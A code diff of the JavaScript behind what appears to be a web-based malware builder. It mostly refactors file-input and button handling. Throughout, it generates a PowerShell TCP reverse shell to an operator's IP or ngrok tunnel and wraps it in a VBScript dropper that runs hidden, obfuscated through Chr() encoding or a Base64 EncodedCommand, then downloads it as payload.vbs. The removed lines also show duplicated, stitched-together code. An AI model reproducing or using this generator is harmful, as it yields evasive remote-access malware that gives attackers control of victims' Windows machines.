@@ -1,47 +1,71 @@
 document.addEventListener('DOMContentLoaded', function() {
-    // Modal elements
+    // Elements
     const modal = document.getElementById('modal');
     const modalTitle = document.getElementById('modal-title');
     const modalMessage = document.getElementById('modal-message');
     const modalClose = document.querySelector('.modal-close');
     const modalOk = document.getElementById('modal-ok');
-    
-    // File input elements
     const vbsFileInput = document.getElementById('vbs-file-input');
     const vbsBrowseBtn = document.getElementById('vbs-browse');
     const vbsFileName = document.getElementById('vbs-file-name');
-    
-    // Input elements
     const ipInput = document.getElementById('ip');
     const portInput = document.getElementById('port');
     const filenameInput = document.getElementById('filename');
     const vbsOutput = document.getElementById('vbs-output');
-    
-    // Button elements
     const generateChrBtn = document.getElementById('generate-chr');
     const generateB64Btn = document.getElementById('generate-b64');
 
-    // Handle file browsing
-    function handleFileBrowse() {
-        vbsFileInput.click();
-    }
+    // Enhanced file input handling
+    function initFileInput() {
+        // Create a more reliable click handler
+        const handleBrowseClick = () => {
+            // Reset input value to ensure change event fires even for same file
+            vbsFileInput.value = '';
+            
+            // For mobile devices, we need to trigger click in a specific way
+            if ('ontouchstart' in window) {
+                const event = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                vbsFileInput.dispatchEvent(event);
+            } else {
+                vbsFileInput.click();
+            }
+        };
 
-    function handleFileChange() {
-        if (vbsFileInput.files.length > 0) {
-            vbsFileName.textContent = vbsFileInput.files[0].name;
-        } else {
-            vbsFileName.textContent = 'No file selected';
-        }
-    }
-
-    // Setup file input events
-    if (vbsBrowseBtn && vbsFileInput) {
-        vbsBrowseBtn.addEventListener('click', handleFileBrowse);
+        // Add multiple event types for maximum compatibility
+        vbsBrowseBtn.addEventListener('click', handleBrowseClick);
         vbsBrowseBtn.addEventListener('touchend', function(e) {
             e.preventDefault();
-            handleFileBrowse();
+            handleBrowseClick();
         });
-        vbsFileInput.addEventListener('change', handleFileChange);
+
+        // More reliable file change handler
+        vbsFileInput.addEventListener('change', function() {
+            if (this.files && this.files.length > 0) {
+                vbsFileName.textContent = this.files[0].name;
+                
+                // For mobile - sometimes need to re-trigger
+                setTimeout(() => {
+                    if (vbsFileName.textContent !== this.files[0].name) {
+                        vbsFileName.textContent = this.files[0].name;
+                    }
+                }, 100);
+            } else {
+                vbsFileName.textContent = 'No file selected';
+            }
+        });
+
+        // Fallback - if all else fails, show the file input directly
+        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+            vbsFileInput.style.display = 'block';
+            vbsFileInput.style.width = '100%';
+            vbsFileInput.style.opacity = '1';
+            vbsFileInput.style.position = 'static';
+            vbsBrowseBtn.style.display = 'none';
+        }
     }
 
     // Modal functions
@@ -51,16 +75,10 @@ document.addEventListener('DOMContentLoaded', function() {
         modal.style.display = 'flex';
         modalTitle.style.color = isError ? 'var(--danger)' : 'var(--secondary)';
     }
-    
+
     function closeModal() {
         modal.style.display = 'none';
     }
-    
-    if (modalClose) modalClose.addEventListener('click', closeModal);
-    if (modalOk) modalOk.addEventListener('click', closeModal);
-    window.addEventListener('click', (e) => {
-        if (e.target === modal) closeModal();
-    });
 
     // Validation functions
     function validateIpOrDomain(value) {
@@ -69,12 +87,12 @@ document.addEventListener('DOMContentLoaded', function() {
         const ngrokPattern = /^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[A-Za-z]{2,}$/;
         return ipPattern.test(value) || domainPattern.test(value) || ngrokPattern.test(value);
     }
-    
+
     function validatePort(port) {
         return port > 0 && port <= 65535;
     }
-    
-    // Payload generation functions
+
+    // Payload generation
     function powershellReverseShell(ip, port) {
         return (
             `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});` +
@@ -90,11 +108,11 @@ document.addEventListener('DOMContentLoaded', function() {
             "}"
         );
     }
-    
+
     function obfuscateChr(text) {
         return '""' + text.split('').map(c => ` & Chr(${c.charCodeAt(0)})`).join('');
     }
-    
+
     function downloadFile(content, filename) {
         const blob = new Blob([content], { type: 'text/plain' });
         const url = URL.createObjectURL(blob);
@@ -106,8 +124,8 @@ document.addEventListener('DOMContentLoaded', function() {
         document.body.removeChild(a);
         URL.revokeObjectURL(url);
     }
-    
-    // Generate CHR Method
+
+    // Generation functions
     function generateChrMethod() {
         const ip = ipInput.value.trim();
         const port = parseInt(portInput.value);
@@ -133,8 +151,7 @@ document.addEventListener('DOMContentLoaded', function() {
             showModal('Error', `Generation failed: ${e.message}`, true);
         }
     }
-    
-    // Generate Base64 Method
+
     function generateBase64Method() {
         const ip = ipInput.value.trim();
         const port = parseInt(portInput.value);
@@ -159,69 +176,35 @@ document.addEventListener('DOMContentLoaded', function() {
             showModal('Error', `Generation failed: ${e.message}`, true);
         }
     }
-    
-    // Add event listeners to buttons
-    if (generateChrBtn) generateChrBtn.addEventListener('click', generateChrMethod);
-    if (generateB64Btn) generateB64Btn.addEventListener('click', generateBase64Method);
-    
-    // Also add touch events for mobile devices
-    if (generateChrBtn) generateChrBtn.addEventListener('touchend', function(e) {
-        e.preventDefault();
-        generateChrMethod();
-    });
-    
-    if (generateB64Btn) generateB64Btn.addEventListener('touchend', function(e) {
-        e.preventDefault();
-        generateBase64Method();
-    });
-});        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
-        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
+
+    // Initialize everything
+    function init() {
+        // Initialize file input
+        initFileInput();
         
-        try {
-            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
-            const payload = powershellReverseShell(ip, port);
-            const obfPayload = obfuscateChr(payload);
-            const vbsContent = (
-                'Set x = CreateObject("WScript.Shell")\n' +
-                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
-            );
-            
-            document.getElementById('vbs-output').value = vbsContent;
-            downloadFile(vbsContent, filename);
-            showModal('Success', 'CHR method VBS generated and saved!');
-        } catch (e) {
-            showModal('Error', `Generation failed: ${e.message}`, true);
+        // Modal events
+        if (modalClose) modalClose.addEventListener('click', closeModal);
+        if (modalOk) modalOk.addEventListener('click', closeModal);
+        window.addEventListener('click', (e) => e.target === modal && closeModal());
+        
+        // Generation buttons
+        if (generateChrBtn) {
+            generateChrBtn.addEventListener('click', generateChrMethod);
+            generateChrBtn.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                generateChrMethod();
+            });
+        }
+        
+        if (generateB64Btn) {
+            generateB64Btn.addEventListener('click', generateBase64Method);
+            generateB64Btn.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                generateBase64Method();
+            });
         }
     }
-    
-    function generateBase64Method() {
-        const ip = document.getElementById('ip').value.trim();
-        const port = parseInt(document.getElementById('port').value);
-        const filename = document.getElementById('filename').value || 'payload.vbs';
-        
-        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
-        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
-        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
-        
-        try {
-            const payload = powershellReverseShell(ip, port);
-            const encoded = btoa(unescape(encodeURIComponent(payload)));
-            const vbsContent = (
-                'Set shell = CreateObject("Wscript.Shell")\n' +
-                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
-            );
-            
-            document.getElementById('vbs-output').value = vbsContent;
-            downloadFile(vbsContent, filename);
-            showModal('Success', 'Base64 method VBS generated and saved!');
-        } catch (e) {
-            showModal('Error', `Generation failed: ${e.message}`, true);
-        }
-    }
-    
-    const generateChrBtn = document.getElementById('generate-chr');
-    const generateB64Btn = document.getElementById('generate-b64');
-    
-    if (generateChrBtn) generateChrBtn.addEventListener('click', generateChrMethod);
-    if (generateB64Btn) generateB64Btn.addEventListener('click', generateBase64Method);
+
+    // Start the application
+    init();
 });
